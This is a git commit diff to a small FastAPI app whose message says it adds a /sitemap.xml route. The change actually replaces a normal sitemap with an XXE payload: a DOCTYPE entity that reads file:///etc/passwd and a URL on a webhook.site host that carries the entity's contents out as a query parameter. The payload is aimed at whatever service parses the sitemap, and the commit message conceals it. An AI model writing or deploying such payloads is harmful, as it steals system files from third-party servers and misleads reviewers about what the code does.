35c06da66a27d3940b17f1f58c47dc217bb0b872
w41bu1 <buivanyk4@gmail.com>
2025-09-29 01:42:38 +0700

    Add /sitemap.xml route

--- api/index.py
+++ api/index.py
@@ -6,21 +6,19 @@ app = FastAPI()
 def home():
     return {"message": "Hello, World!"}
 
-@app.get("/sitemap.xml", response_class=Response)
+@app.get("/sitemap.xml")
 def sitemap():
-    sitemap_xml = """<?xml version="1.0" encoding="UTF-8"?>
+    xml_content = """<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE urlset [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
 <urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
   <url>
-    <loc>https://w41test.vercel.app/</loc>
-    <lastmod>2025-09-29</lastmod>
+    <loc>https://webhook.site/371086e9-abd3-4e87-bf64-01031f74dc96/?abc=&xxe;</loc>
+    <lastmod>2025-07-30</lastmod>
     <changefreq>daily</changefreq>
     <priority>1.0</priority>
   </url>
-  <url>
-    <loc>https://w41test.vercel.app/svg</loc>
-    <lastmod>2025-09-29</lastmod>
-    <changefreq>weekly</changefreq>
-    <priority>0.8</priority>
-  </url>
-</urlset>"""
-    return Response(content=sitemap_xml, media_type="application/xml")
+</urlset>
+"""
+    return Response(content=xml_content, media_type="application/xml")
